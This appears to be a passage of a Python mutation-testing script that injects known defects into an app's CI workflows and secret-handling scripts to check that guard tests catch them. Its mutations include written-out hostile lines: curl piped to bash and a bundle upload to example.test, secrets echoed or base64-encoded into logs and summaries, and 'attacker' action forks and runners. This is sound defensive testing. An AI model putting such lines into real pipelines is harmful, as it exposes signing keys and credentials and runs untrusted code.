#!/usr/bin/env python3
"""Apply known defects to the repository and require the guard suite to catch each.

Four verification rounds of M1 found ~50 defects, and every one of #167-#175 is
the same sentence: *a mutation survived*. Guards were written, believed, and
then shown to be substring checks or scoped to one job. The only thing that
reliably told us so was mutating the code and watching the suite stay green.

So that check stops being something a reviewer does by hand once a round, and
becomes a step CI runs every time.

Each entry below is a defect this project actually shipped or nearly shipped,
with the issue that found it. The battery fails if the suite does NOT go red.

Two rules learned the hard way:

  * A mutation must really change the file. A pattern that no longer matches
    silently tests nothing (#160).
  * A mutation of a YAML file must leave it PARSEABLE. A mutation that breaks
    the syntax makes the guard fail for the wrong reason and reports a false
    pass -- which is exactly what #172 was: `replaceFirst` inserted a literal
    `$1`, the YAML broke, and the battery called it caught.

Usage:  tools/mutation_check.py [--list] [--only SUBSTRING]
Exit:   0 every mutation was caught
        1 at least one survived (the suite stayed green)
        2 the battery could not run (dirty tree, bad pattern, unparseable)
"""
from __future__ import annotations

import argparse
import dataclasses
import pathlib
import re
import subprocess
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
SUITE = ["flutter", "test", "--no-pub", "--tags", "guard"]
IN_FLIGHT = ROOT / ".mutation_check_in_flight"


@dataclasses.dataclass(frozen=True)
class Mutation:
    issue: str
    name: str
    path: str
    apply: object  # str -> str
    why: str
    expect: str = ""
    also: tuple = ()
    """A substring of the reason the RIGHT assertion prints when it fires.

    Without this the battery measures "the suite went red", which is not the
    same as "this guard caught it" -- the first version of this file reported
    two mutations as caught when what had actually failed was an unrelated
    test that happens to read the same file. That is the mistake the battery
    exists to find, made by the battery.

    `also` carries further `(path, apply)` edits. Some defects are not
    expressible in one file: #203 is "a second parse path is added AND the
    rules are repointed at it", and the one-file version -- repoint the rules
    at a method that does not exist -- only breaks the compile. That reported
    WRONG-REASON, correctly, for two rounds. A mutation that cannot be written
    truthfully is not a mutation.
    """


def sub(pattern: str, replacement: str, count: int = 1, flags: int = 0):
    """A regex substitution that must match, with the group expansion Dart's
    replaceFirst does NOT do (#172)."""

    def go(text: str) -> str:
        out, n = re.subn(pattern, replacement, text, count=count, flags=flags)
        if n == 0:
            raise LookupError(f"pattern never matched: {pattern!r}")
        return out

    return go


def append(block: str):
    return lambda text: text.rstrip("\n") + "\n" + block


def chain(*steps):
    """Several substitutions on one file, in order.

    A defect that MOVES something is two edits, and writing it as one -- a
    delete without the matching insert -- tests a different defect than its
    name claims (#207: the deletion left every refusal working, so the
    ordering assertion correctly stayed silent).
    """

    def go(text: str) -> str:
        for step in steps:
            text = step(text)
        return text

    return go


MUTATIONS: list[Mutation] = [
    # ---- the command must run, not merely appear (#167) -------------------
    Mutation("#167", "gate.sh made advisory", ".github/workflows/ci.yml",
             sub(r"run: tools/gate\.sh$", "run: tools/gate.sh || true", flags=re.M),
             "CI would run the gate and ignore its verdict",
             'ci-shape: the gate step must run'),
    Mutation("#167", "invariant-1 scan made advisory", ".github/workflows/release.yml",
             sub(r"run: tools/check_aab\.sh$", "run: tools/check_aab.sh || true", flags=re.M),
             "the permission scan's failure would be discarded on the tag path",
             'release-shape: `scan` must run'),
    Mutation("#167", "certificate check made advisory", ".github/workflows/release.yml",
             sub(r"run: tools/verify_upload_cert\.sh$",
                 "run: tools/verify_upload_cert.sh || true", flags=re.M),
             "a bundle signed with the wrong key would ship",
             'release-shape: `cert` must run'),
    Mutation("#167", "invariant guards made advisory", ".github/workflows/ci.yml",
             sub(r"(run: flutter test --no-pub --tags guard)$", r"\1 || true", flags=re.M),
             "a breached invariant would not fail the PR",
             'ci-shape: the invariant guards'),

    # ---- tracing (#168) ---------------------------------------------------
    Mutation("#168", "workflow-level shell: bash -x", ".github/workflows/release.yml",
             sub(r"^    shell: bash$", "    shell: bash -x", flags=re.M),
             "traces every step in the job holding all five secrets",
             'traces every expanded command'),
    Mutation("#168", "workflow-level shell: bash -x in ci", ".github/workflows/ci.yml",
             sub(r"^    shell: bash$", "    shell: bash -x", flags=re.M),
             "same, on every pull request",
             'traces every expanded command'),

    # ---- scope: a second job (#169) ---------------------------------------
    Mutation("#169", "a second job uploads to production", ".github/workflows/release.yml",
             append("""  publish_prod:
    needs: ship
    runs-on: ubuntu-latest
    steps:
      - id: play2
        uses: r0adkll/upload-google-play@v1
        with:
          serviceAccountJsonPlainText: ${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
          packageName: com.honestarcade.sudoku
          releaseFiles: build/app/outputs/bundle/release/app-release.aab
          track: production
          status: completed"""),
             "automation reaches production, and the summary still says internal",
             'release-shape: exactly these three jobs'),
    Mutation("#169", "continue-on-error on the gate job", ".github/workflows/release.yml",
             sub(r"^  gate:$", "  gate:\n    continue-on-error: true", flags=re.M),
             "`needs: gate` succeeds on a red gate, so a failing build ships",
             'carries `continue-on-error`'),
    Mutation("#169", "the Play upload becomes conditional", ".github/workflows/release.yml",
             sub(r"(      - id: play\n)", r"\1        if: always()\n"),
             "an earlier failure no longer prevents the upload",
             'release-shape: `if:` or `continue-on-error` on the upload'),
    Mutation("#169", "the upload action is swapped for a fork", ".github/workflows/release.yml",
             sub(r"r0adkll/upload-google-play@v1", "attacker/upload-google-play@v1"),
             "a fork of the action receives the Play credential",
             'release-shape: the upload action must be the pinned one'),
    Mutation("#169", "the package name is changed", ".github/workflows/release.yml",
             sub(r"packageName: com\.honestarcade\.sudoku", "packageName: com.attacker.app"),
             "the bundle is uploaded against someone else's listing",
             'release-shape: the upload must name THIS package'),

    # ---- triggers (#170) --------------------------------------------------
    # ---- #190: the leak shapes #176 listed and did not close ---------------
    Mutation("#190", "a secret is written to a file under HOME", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "$KEYSTORE_PASS" > "$HOME/leak.txt"\n'),
             "a secret on disk is leaked as surely as one printed",
             'reached file'),
    Mutation("#190", "a partial secret, first 8 characters", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "pw8: ${KEYSTORE_PASS:0:8}"\n'),
             "eight characters of a password narrows a search enormously",
             'first 8 characters'),
    Mutation("#190", "a base64-transformed secret", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1printf %s "$KEYSTORE_PASS" | base64\n'),
             "a literal scan is defeated by any encoding, trivially reversible",
             'base64'),
    Mutation("#190", "the password moves onto keytool's argv", "tools/set_ci_secrets.sh",
             sub(r"-storepass:env HS_PASS_PROBE", '-storepass "$KEYSTORE_PASS"'),
             "the password becomes readable from the process table by anything on the machine",
             'command line'),
    Mutation("#190", "make_upload_key.sh prints the password", "tools/make_upload_key.sh",
             sub(r'(chmod 600 "\$KEYSTORE"\n)', r'\1echo "pw: $HS_KEYSTORE_PASS"\n'),
             "the only script holding the plaintext password was outside the leak group",
             'reached stdout'),
    # ---- #208: the channels and the chokepoint ---------------------------
    # All four were GREEN at round eight.
    Mutation("#208", "the service-account key goes on gcloud's command line",
             ".github/workflows/play-api-check.yml",
             sub(r'(gcloud auth activate-service-account --key-file "\$key" --quiet)',
                 r'\1 --debug-sa "$PLAY_SERVICE_ACCOUNT_JSON"', 1),
             "the whole key lands in the process table, readable by any later step",
             'gcloud.log'),
    # Placed AFTER the credentials are read, and using the name the script
    # actually binds. The first draft wrote `${HS_KEYSTORE_PASS:-}` before
    # line 92 gives `KEYSTORE_PASS` its value, so it created an empty file and
    # SURVIVED -- the battery reporting, correctly, that the mutation tested
    # nothing. The guard was never the problem.
    Mutation("#208", "a password is written into the workspace",
             "tools/set_ci_secrets.sh",
             sub(r'(KEY_PASS="\$\(read_credential HS_KEY_PASS\)"\n)',
                 r'\1printf "%s" "$KEYSTORE_PASS" > "$PWD/hs-leak-probe.txt"\n', 1),
             "on CI the workspace is $GITHUB_WORKSPACE, which upload-artifact sweeps",
             'GITHUB_WORKSPACE'),
    Mutation("#208", "the key is copied beside the one path forget removes",
             ".github/workflows/play-api-check.yml",
             sub(r'(\n(\s*)gcloud auth activate-service-account)',
                 r'\n\2mkdir -p "$RUNNER_TEMP/keep"\n\2cp "$key" "$RUNNER_TEMP/keep/play-sa.json"\1', 1),
             "the suffix exemption covered any path ending in that name",
             'leak:'),
    Mutation("#208", "a process is started outside the chokepoint",
             "test/guards/secrets_scripts_test.dart",
             sub(r"(\nvoid main\(\) \{)",
                 r'\nvoid _bypass() async {\n'
                 r'  await Process.start("/bin/bash", ["x.sh"]);\n'
                 r'}\1', 1),
             "Process.start, Process.run and tear-offs all walked past the old rule",
             'leak-chokepoint'),
    # ---- #206: the key link, proven by running the step ------------------
    # All three were GREEN at round eight, against `tools/play_promote.sh` --
    # the one key link no other guard covered -- because the test asked
    # whether the step's TEXT contained the script name.
    Mutation("#206", "play_promote.sh's failure is swallowed",
             ".github/workflows/play-promote.yml",
             sub(r'(\| tee "\$RUNNER_TEMP/promote\.out")', r"\1 || true", 1),
             "every refusal the script makes can be neutered while the step reports success",
             'propagation'),
    Mutation("#206", "the play_promote.sh call is commented out",
             ".github/workflows/play-promote.yml",
             sub(r"^(\s*)(tools/play_promote\.sh)", r"\1# \2", 1, re.M),
             "a substring in a shell comment satisfied the old key-link test",
             'vacuity'),
    Mutation("#206", "play_promote.sh is renamed to a file that does not exist",
             ".github/workflows/play-promote.yml",
             sub(r"tools/play_promote\.sh", "tools/play_promote.sh.disabled", 1),
             "the workflow called a missing file while the guard reported the link wired",
             'vacuity'),
    # GREEN at round eight: only PROMOTE_OUTCOME was pinned, so a real
    # internal->alpha promotion could publish "internal -> production".
    Mutation("#209", "the summary step's TO_TRACK is a literal production",
             ".github/workflows/play-promote.yml",
             sub(r"(PROMOTE_OUTCOME:[^\n]*\n(?:[^\n]*\n)*?\s*)TO_TRACK: \$\{\{ inputs\.to_track \}\}",
                 r"\1TO_TRACK: production", 1),
             "a forged production claim in the run summary — #142's threat model",
             'refusal'),
    # ---- #203: the parse path, decided by running the rules --------------
    # The mutation the TEXT assertion cannot see. Repointing five of six call
    # sites satisfies its set equality, because one surviving `Workflow.parse(`
    # is all it looks for. Round eight proved that green. The execution test
    # catches it, which is the whole of #205 in one entry.
    Mutation("#203", "five of six rules reach an unguarded second parse path",
             "test/guards/workflow_rules.dart",
             sub(r"Workflow\.parse\(", "WorkflowFast.of(", 5),
             "the error handling is unreachable from five of the six rules",
             'parse-path',
             also=(("test/guards/workflow_yaml.dart",
                    append("extension WorkflowFast on Workflow {\n"
                           "  static Workflow of(String path, String text) {\n"
                           "    final doc = loadYaml(text);\n"
                           "    return Workflow.parse(path, text, load: (_) => doc);\n"
                           "  }\n"
                           "}\n")),)),
    # ---- #202: the ruleset, compared as whole tokens ---------------------
    # All three were GREEN at round eight: `contains('active')` is satisfied
    # by `inactive`, and `contains('gate:15368')` by `CI / gate:15368` --
    # the PR UI rendering the guard's own message warns about.
    Mutation("#202", "a disabled ruleset is accepted", "test/guards/workflow_guard_test.dart",
             sub(r"(final doc = jsonDecode\(payload\) as Map<String, dynamic>;\n)",
                 r"\1      doc['enforcement'] = 'disabled';\n", 1),
             "the merge gate can be switched off and the guard says nothing",
             'ruleset'),
    Mutation("#202", "the PR-UI rendering is accepted as the context",
             "test/guards/workflow_guard_test.dart",
             sub(r"'\$\{\(check as Map\)\['context'\]\}:\$\{check\['integration_id'\]\}',",
                 "'CI / ${(check as Map)['context']}:${check['integration_id']}',", 1),
             "#137's exact failure: the rendered name is not the check-run name",
             'ruleset'),
    Mutation("#202", "the ruleset stops targeting the default branch",
             "test/guards/workflow_guard_test.dart",
             sub(r"(final doc = jsonDecode\(payload\) as Map<String, dynamic>;\n)",
                 r"\1      (doc['conditions']['ref_name'] as Map)['include'] = "
                 r"['refs/heads/nothing'];\n", 1),
             "a ruleset can be active and still not guard main",
             'ruleset'),
    # ---- #203/#207: the call site, and the ordering ----------------------
    # The defect as it would really arrive: the second entry point is ADDED,
    # and then the rules are repointed at it. Both halves, or the mutation is
    # a compile error wearing the name of a guard failure.
    Mutation("#203", "a second parse path is added and the rules repointed at it",
             "test/guards/workflow_rules.dart",
             sub(r"Workflow\.parse\(", "Workflow.parseFast(", 0),
             "the StackOverflowError handler becomes unreachable from every rule",
             'parse-path',
             also=(("test/guards/workflow_yaml.dart",
                    sub(r"(  static Workflow parse\(\n)",
                        "  static Workflow parseFast(String path, String text) =>\n"
                        "      parse(path, text);\n\n"
                        r"\1")),)),
    # A MOVE, not a delete: deleting the token check leaves every refusal
    # working, so the ordering assertion is right to stay silent (#207).
    Mutation("#207", "the token check moves above the argument checks", "tools/play_promote.sh",
             chain(
                 sub(r'\n# ---- credential -+\n\n\[ -n "\$\{PLAY_TOKEN:-\}" \] \|\| '
                     r'die_args "PLAY_TOKEN is not set"\n', "\n"),
                 sub(r"(# ---- arguments, before anything else -+\n\n)",
                     '\\1[ -n "${PLAY_TOKEN:-}" ] || die_args "PLAY_TOKEN is not set"\n\n'),
             ),
             "a bad track is no longer refused before the token is demanded",
             'order:'),
    # ---- #204: the shell questions, asked of bash ------------------------
    Mutation("#204", "|| true hidden behind a shell comment", ".github/workflows/release.yml",
             sub(r'(-alias "\$HS_KEY_ALIAS" > /dev/null)\n', r'\1 || true # tolerate\n'),
             "a `#` inside the line defeated the regex; bash is not fooled",
             'propagation'),
    Mutation("#204", "set +o errexit, the long form", ".github/workflows/release.yml",
             sub(r"(          set -euo pipefail\n)(          # A PKCS12)", r"\1          set +o errexit\n\2"),
             "the regex matched `set +e` and not its synonym",
             'propagation'),
    Mutation("#204", "the permission scan is backgrounded", ".github/workflows/release.yml",
             sub(r"(run: tools/check_aab\.sh)$", r"\1 &", 1, re.M),
             "a backgrounded command's exit status is never waited on",
             'propagation'),
    # The mutation that was GREEN until the vacuity check landed: the build
    # step stops building. `${{ … }}` is a bash bad substitution, so the body
    # aborted before `flutter` was ever reached and `isNot(0)` held whatever
    # the step did (round eight).
    Mutation("#204", "the build step stops building", ".github/workflows/release.yml",
             sub(r"^(\s*)flutter build appbundle(?:[^\n]*\\\n)*[^\n]*\n",
                 r'\1echo "built"\n', 1, re.M),
             "the step that produces the shipped bundle no longer produces it",
             'propagation'),
    # And the guard on that guard: without the expansion the harness performs,
    # `build` cannot pass, and the vacuity assertion must say so.
    Mutation("#204", "the harness stops expanding ${{ }} before bash sees it",
             "test/guards/workflow_guard_test.dart",
             sub(r"RegExp\(r'\\\$\\\{\\\{\[\^\}\]\*\\\}\\\}'\)",
                 "RegExp(r'THIS-MATCHES-NOTHING')", 1),
             "a step that cannot pass makes its propagation check unfalsifiable",
             'vacuity'),
    # Round eight: both of these were GREEN. The step set was pinned for two
    # of four files, so the job that runs on every failed gate -- and reads
    # every workflow-level secret -- was unpinned, and a brand-new workflow
    # file was not looked at by anything.
    Mutation("#209", "a step exfiltrates the keystore from report-gate-failure",
             ".github/workflows/release.yml",
             sub(r"^      - id: say$",
                 '      - id: sneak\n'
                 '        name: Sneak\n'
                 '        run: echo "$HS_KEYSTORE_B64" >> "$GITHUB_STEP_SUMMARY"\n'
                 '\n'
                 '      - id: say',
                 1, re.M),
             "the job that runs on every failed gate was pinned by name only",
             'step-set'),
    # ---- #208/#206/#209: the chokepoint, the key links, the step sets -----
    Mutation("#208", "the service-account key reaches the job summary",
             ".github/workflows/play-api-check.yml",
             sub(r'(            echo "Tracks: \$\{names:-none yet[^\n]*\n)',
                 r'\1            echo "sa: $PLAY_SERVICE_ACCOUNT_JSON"\n'),
             "the whole private key lands in a rendered, retained, downloadable artifact",
             'reached'),
    Mutation("#208", "the keystore base64 reaches the job summary",
             ".github/workflows/play-api-check.yml",
             sub(r'(            echo "\| committed certificate[^\n]*\n)',
                 r'\1            echo "| b64 | $HS_KEYSTORE_B64 |"\n'),
             "the base64 of the entire keystore lands in the summary",
             'reached'),
    Mutation("#206", "release.yml stops calling ci_version.sh",
             ".github/workflows/release.yml",
             sub(r'tools/ci_version\.sh "\$GITHUB_REF_NAME"',
                 'echo name=9.9.9; echo code=9999; : "$GITHUB_REF_NAME"', 0),
             "tag validation and the version-code formula become dead code",
             # Caught by running the step now, not by a substring (#206).
             'propagation'),
    Mutation("#206", "play-promote.yml stops calling play_promote.sh",
             ".github/workflows/play-promote.yml",
             sub(r"tools/play_promote\.sh com\.honestarcade\.sudoku",
                 "echo promoted=999; : com.honestarcade.sudoku", 0),
             "the track allowlist and production refusal become dead code",
             'propagation'),
    Mutation("#209", "a new step publishes the promoted line",
             ".github/workflows/play-promote.yml",
             sub(r"^      - id: promote$",
                 '      - id: note\n'
                 '        run: echo ok\n'
                 '      - id: promote',
                 1, re.M),
             "an inserted step runs with whatever the job holds — here a live Play token",
             'step-set'),
    Mutation("#209", "the summary reports a hardcoded outcome",
             ".github/workflows/play-promote.yml",
             sub(r"PROMOTE_OUTCOME: \$\{\{ steps\.promote\.outcome \}\}",
                 "PROMOTE_OUTCOME: success"),
             "a failed run reports the promote step ended as success",
             'refusal'),
    Mutation("#209", "the sidecar computes nothing",
             ".github/workflows/release.yml",
             sub(r'sha256sum "\$aab" > "\$aab\.sha256"', ': > "$aab.sha256"'),
             "the checksum sidecar is empty and the re-download compare is vacuous",
             'sidecar must compute'),
    # ---- #198: the summary must not claim what did not happen -------------
    Mutation("#198", "the summary gate becomes if true", ".github/workflows/play-promote.yml",
             sub(r'if \[ "\$PROMOTE_OUTCOME" = "success" \] && \[ -n "\$codes" \]; then',
                 "if true; then"),
             "#130 verbatim: every failure path publishes a promoted line",
             'summary-honesty'),
    Mutation("#198", "the outcome check is dropped", ".github/workflows/play-promote.yml",
             sub(r'if \[ "\$PROMOTE_OUTCOME" = "success" \] && \[ -n "\$codes" \]; then',
                 'if [ -n "$codes" ]; then'),
             "tee creates promote.out when the step starts, so codes alone prove nothing",
             'summary-honesty'),
    Mutation("#198", "the empty-track refusal is neutered", "tools/play_promote.sh",
             sub(r'die_api "no completed release on \$FROM"', "true", 0),
             "a track holding only a draft promotes nothing and reports success",
             'no-completed-release'),
    Mutation("#198", "the signed artifact is renamed", ".github/workflows/release.yml",
             sub(r"name: honest-sudoku-signed-\$\{\{ github\.ref_name \}\}", "name: bundle"),
             "the artifact no longer identifies the tag it came from",
             'artifact name must carry the tag'),
    # ---- #197: the swallow forms, and the classes closed in one file ------
    Mutation("#197", "|| true hidden behind a shell comment", ".github/workflows/release.yml",
             sub(r'(-alias "\$HS_KEY_ALIAS" > /dev/null)\n', r'\1 || true # tolerate a wrong alias\n'),
             "the helper never stripped comments, so one character reinstated #189",
             'discards the exit status'),
    Mutation("#197", "set +e disarms the body", ".github/workflows/release.yml",
             sub(r"(          set -euo pipefail\n)(          # A PKCS12)", r"\1          set +e\n\2"),
             "every command after it can fail without failing the step",
             'discards the exit status'),
    Mutation("#197", "|| true on the gh upload", ".github/workflows/release.yml",
             sub(r"(gh release upload[^\n]*)", r"\1 || true"),
             "gh was missing from the command list, in the step gh IS",
             'discards the exit status'),
    Mutation("#197", "continue-on-error on ci's shellcheck step", ".github/workflows/ci.yml",
             sub(r"(      - id: shellcheck\n)", r"\1        continue-on-error: true\n"),
             "only three ci steps were required to be unconditional",
             'is conditional'),
    Mutation("#197", "ci's gate job moves to a self-hosted runner", ".github/workflows/ci.yml",
             sub(r"^  gate:\n    runs-on: ubuntu-latest$", "  gate:\n    runs-on: attacker-self-hosted", 1, re.M),
             "runsOn was asserted in release.yml only, and ci.yml inherits secrets",
             'runs on `attacker-self-hosted`'),
    # ---- #200: the rows #190 left open, and #186's own reproduction -------
    # The five #190 entries below this block all covered rows that ALREADY
    # passed before #190's fix. A battery entry for a case that was never
    # broken certifies nothing — which is the complaint #190 itself made
    # about #176, reproduced one level up (#200). These are the open ones.
    Mutation("#200", "a leak appended to the pre-flight failure path", "tools/set_ci_secrets.sh",
             sub(r"(do not open the keystore\.[^\n]*\n)", r'\1  echo "debug: $KEYSTORE_PASS" >&2\n'),
             "a debugging echo on an unasserted failure path prints the password",
             'reached stderr'),
    Mutation("#200", "a leak appended to the keytool-SKIPPED path", "tools/set_ci_secrets.sh",
             sub(r"(pre-flight is SKIPPED[^\n]*\n)", r'\1  echo "debug: $KEYSTORE_PASS" >&2\n'),
             "the same, on the path taken when keytool cannot be resolved",
             'reached stderr'),
    Mutation("#200", "a leak to $TMPDIR", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "$KEYSTORE_PASS" > "${TMPDIR:-/tmp}/leak.txt"\n'),
             "a dump to scratch space, where $RUNNER_TEMP holds the decoded keystore",
             'reached file'),
    Mutation("#200", "a rot13-transformed leak", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1printf %s "$KEYSTORE_PASS" | tr A-Za-z N-ZA-Mn-za-m\n'),
             "a transform the fixed five-form set did not cover",
             'rot13'),
    Mutation("#200", "the password's LAST 8 characters", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "tail: ${KEYSTORE_PASS: -8}"\n'),
             "_leakForms yielded only the first 8",
             'last 8 characters'),
    Mutation("#200", "a password onto argv in the WORKFLOW", ".github/workflows/play-api-check.yml",
             sub(r"-storepass:env HS_KEYSTORE_PASS", '-storepass "$HS_KEYSTORE_PASS"', 0),
             "#186's own reproduction: the source rule scanned tools/ only",
             'command line'),
    Mutation("#183", "--fail removed from the edit deletion", "tools/play_promote.sh",
             sub(r"curl -sS --fail --connect-timeout 10 --max-time 30",
                 "curl -sS --connect-timeout 10 --max-time 30"),
             "curl exits 0 on 4xx/5xx without --fail, so the warning cannot fire",
             'still pending'),
    # ---- #182: the upload rule applied to every file, and step sets -------
    Mutation("#182", "a Play upload added to ci.yml", ".github/workflows/ci.yml",
             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
                 r"\1\n      - id: exfil\n        uses: r0adkll/upload-google-play@v1\n"
                 "        with:\n          serviceAccountJsonPlainText: x\n          track: production\n"),
             "ci.yml is workflow_called with secrets: inherit, so this uploads with the real key on a tag",
             'upload-scope:'),
    Mutation("#182", "an extra step in the ci gate job", ".github/workflows/ci.yml",
             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
                 r"\1\n      - id: extra\n        run: curl -sSL https://example.test/x | bash\n"),
             "an added step in the gate job runs with whatever secrets the caller inherited",
             'ci-shape: exactly these steps'),
    Mutation("#182", "a step between play and summary curls the bundle out", ".github/workflows/release.yml",
             sub(r"^      - id: summary$",
                 "      - id: exfil\n        run: curl -X POST --data-binary @app.aab https://example.test/x\n      - id: summary", flags=re.M),
             "the signed bundle leaves the runner after the upload and before the summary",
             'release-shape: exactly these steps'),
    Mutation("#182", "ship moves to a self-hosted runner", ".github/workflows/release.yml",
             sub(r"^    runs-on: ubuntu-latest$", "    runs-on: attacker-self-hosted", 1, re.M),
             "a self-hosted runner sees every secret this workflow holds",
             'runs on `attacker-self-hosted`'),
    # ---- #189: the merge gate, and three tracing variants -----------------
    Mutation("#189", "if: false on the ci gate job", ".github/workflows/ci.yml",
             sub(r"^  gate:\n    runs-on: ubuntu-latest$",
                 "  gate:\n    if: false\n    runs-on: ubuntu-latest", flags=re.M),
             "the entire merge gate is skipped, and a skipped required check does not block a merge",
             'A skipped job reports as skipped'),
    Mutation("#189", "|| true on the keystore alias check", ".github/workflows/release.yml",
             sub(r'-alias "\$HS_KEY_ALIAS" > /dev/null$',
                 '-alias "$HS_KEY_ALIAS" > /dev/null || true', flags=re.M),
             "a keystore whose alias is not the configured one passes the check meant to catch it",
             'discards the exit status'),
    Mutation("#189", "shell: bash -o xtrace, the long form", ".github/workflows/release.yml",
             sub(r"^defaults:\n  run:\n    shell: bash$",
                 "defaults:\n  run:\n    shell: bash -o xtrace", flags=re.M),
             "every step of the job holding five secrets is traced",
             'secrets:'),
    Mutation("#189", "SHELLOPTS: xtrace in the ship env", ".github/workflows/release.yml",
             sub(r'^      FLUTTER_SUPPRESS_ANALYTICS: "true"$',
                 '      FLUTTER_SUPPRESS_ANALYTICS: "true"\n      SHELLOPTS: xtrace', flags=re.M),
             "bash reads SHELLOPTS at startup, so every step of the job is traced",
             'secrets:'),
    Mutation("#170", "pull_request_target added", ".github/workflows/ci.yml",
             sub(r"^  pull_request:$", "  pull_request:\n  pull_request_target:", flags=re.M),
             "fork code runs with the base repo's secrets and a write token",
             'ci-shape: exactly these triggers'),
    Mutation("#170", "the release trigger becomes a branch", ".github/workflows/release.yml",
             sub(r"    tags:\n      - 'v\*'\n", "    branches:\n      - main\n"),
             "every merge to main would ship to Play",
             'release-shape: only a version tag ships'),

    # ---- the promote refusal (#171) ---------------------------------------
    Mutation("#171", "the refusal is commented out", ".github/workflows/play-promote.yml",
             sub(r"^(\s*)exit 1$", r"\1: # exit 1", count=0, flags=re.M),
             "the step still mentions exit 1 and production, and refuses nothing",
             'was ACCEPTED by the refusal step'),
    Mutation("#171", "a later step becomes unconditional",
             ".github/workflows/play-promote.yml",
             sub(r"(      - id: promote\n)", r"\1        if: always()\n"),
             "the promotion runs even when the refusal failed",
             'so it can run although the refusal failed'),
    Mutation("#171", "a second job with no refusal", ".github/workflows/play-promote.yml",
             append("""  sneaky:
    runs-on: ubuntu-latest
    steps:
      - id: token
        run: gcloud auth activate-service-account --key-file k.json
      - id: promote
        run: tools/play_promote.sh com.honestarcade.sudoku internal production"""),
             "a job with no refusal mints the credential and promotes",
             'not the dispatch input'),

    # ---- play-api-check's keystore step (#173) ----------------------------
    # Was "the alias assertion is disabled", replacing `if [ "$alias_got" !=
    # "$alias_want" ]` with `if false`. #180 deleted that block as dead code:
    # with `-alias`, keytool echoes back the REQUESTED spelling, so the
    # comparison could never fire. The battery reported BROKEN rather than
    # passing over the missing pattern, which is the verdict it exists for.
    #
    # The defect the old entry stood for is still real, and this is the
    # spelling of it that survives: without `-alias`, keytool lists the whole
    # keystore, the step reads the FIRST entry, and a multi-entry keystore
    # whose first alias is not the configured one passes here and fails in
    # release.yml (#165).
    Mutation("#173", "keytool -list loses its -alias", ".github/workflows/play-api-check.yml",
             sub(r' -alias "\$HS_KEY_ALIAS" > "\$listing"', ' > "$listing"'),
             "the alias check asks about the whole keystore, not the configured entry",
             'keytool -list is asked for the configured alias'),
    Mutation("#173", "the fingerprint comparison is dropped",
             ".github/workflows/play-api-check.yml",
             sub(r'if \[ "\$bundle_fp" != "\$pem_fp" \]; then', "if false; then"),
             "the uploaded keystore need not match the committed certificate",
             'a keystore that is not the committed certificate is refused'),
    Mutation("#173", "the tracks grep loses its || true",
             ".github/workflows/play-api-check.yml",
             sub(r"\{ grep -oE '\"track\":\"\[a-z\]\+\"' \|\| true; \}",
                 "grep -oE '\"track\":\"[a-z]+\"'"),
             "a brand-new app with no tracks fails the check it must pass",
             'empty-tracks'),

    # ---- the keypass equality (#174) --------------------------------------
    Mutation("#174", "the keypass check is deleted", ".github/workflows/release.yml",
             sub(r'          if \[ "\$HS_KEY_PASS" != "\$HS_KEYSTORE_PASS" \]; then.*?\n          fi\n',
                 "", flags=re.S),
             "a mismatch reaches the four-minute Gradle build again",
             'differing passwords are refused before the build'),
    Mutation("#174", "the keypass check is inverted", ".github/workflows/release.yml",
             sub(r'if \[ "\$HS_KEY_PASS" != "\$HS_KEYSTORE_PASS" \]; then',
                 'if [ "$HS_KEY_PASS" = "$HS_KEYSTORE_PASS" ]; then'),
             "every correct release fails",
             'matching passwords pass'),

    # ---- the unconverted rules (#175) -------------------------------------
    Mutation("#175", "an unpinned action in flow style", ".github/workflows/release.yml",
             # Appended after the last step, not before the first: inserting it at
             # the front changes `ids.first` and the shape assertion fires for a
             # reason that has nothing to do with pinning.
             sub(r"(      - id: shred\n(?:.*\n)*?        run: [^\n]*\n)",
                 r"\1      - {uses: attacker/action}\n"),
             "an unpinned third party inside the merge gate",
             'every action is pinned'),
    Mutation("#175", "write-all permissions, quoted", ".github/workflows/release.yml",
             sub(r"^permissions:\n  contents: read$",
                 "permissions: 'write-all'", flags=re.M),
             "the job gets every scope",
             'declares its permissions'),

    # ---- the scripts ------------------------------------------------------
    Mutation("#176", "the password is printed", "tools/set_ci_secrets.sh",
             sub(r'(echo "set: HS_KEYSTORE_B64)', r'echo "pw: $KEY_PASS"\n\1'),
             "the keystore password reaches stdout",
             'leak:'),
    Mutation("#176", "the private key is printed", "tools/setup_play_ci.sh",
             sub(r'(  gh secret set "\$SECRET")', r'  cat "$KEY_PATH"\n\1'),
             "the service-account private key reaches stdout",
             'leak:'),
    Mutation("#176", "secrets go to another repository", "tools/set_ci_secrets.sh",
             sub(r'REPO="honestarcade/HonestSudoku"', 'REPO="attacker/Evil"'),
             "the real keystore is uploaded to someone else's repository",
             'destination:'),
    Mutation("#176", "the key survives a failed upload", "tools/setup_play_ci.sh",
             sub(r"^  trap cleanup_key EXIT INT TERM$", "  : # trap removed", flags=re.M),
             "a live private key is left on disk and the next run mints another",
             'setup-fail:'),
    Mutation("#176", "an IAM role is granted", "tools/setup_play_ci.sh",
             sub(r"(    --display-name \"Honest Sudoku CI\" \\\n)",
                 r"\1    --role roles/owner \\\n"),
             "the service account gets authority nobody needs",
             'iam:'),
    Mutation("#178", "a negative version code is accepted", "tools/play_release_codes.py",
             sub(r'r"\[0-9\]\+"', 'r"-?[0-9]+"'),
             "a negative code is promoted as a version code",
             'negative'),
    Mutation("#159", "the newline guard is removed", "tools/ci_version.sh",
             sub(r'has_newline "\$run" && die "run number contains a newline"\n', ""),
             "a newline in the run number is accepted again",
             'newline was accepted'),
